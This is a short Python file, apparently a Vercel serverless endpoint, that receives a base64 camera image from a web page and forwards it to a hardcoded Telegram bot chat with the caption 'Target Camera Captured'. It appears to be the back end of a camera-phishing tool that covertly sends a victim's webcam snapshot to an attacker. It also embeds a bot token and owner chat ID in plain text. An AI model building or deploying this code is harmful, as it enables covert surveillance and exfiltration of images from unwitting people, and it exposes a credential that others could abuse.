import json
import base64
import requests
from http.server import BaseHTTPRequestHandler

BOT_TOKEN = "8857558695:AAGOlJ_9PzeyvaOku_2_-MxjdbZJILC1cQI"
OWNER_CHAT_ID = 6478868514

class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode('utf-8'))
            
            image_data = data.get('image')
            if image_data:
                header, encoded = image_data.split(",", 1)
                image_bytes = base64.b64decode(encoded)
                
                files = {'photo': ('captured.jpg', image_bytes, 'image/jpeg')}
                data_payload = {
                    'chat_id': OWNER_CHAT_ID,
                    'caption': '📸 **Target Camera Captured via Vercel**',
                    'parse_mode': 'Markdown'
                }
                
                # Telegram API request
                response = requests.post(f'https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto', data=data_payload, files=files)
                print("Telegram Response:", response.text)

            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"status": "success"}).encode())
        except Exception as e:
            self.send_response(500)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"error": str(e)}).encode())
            
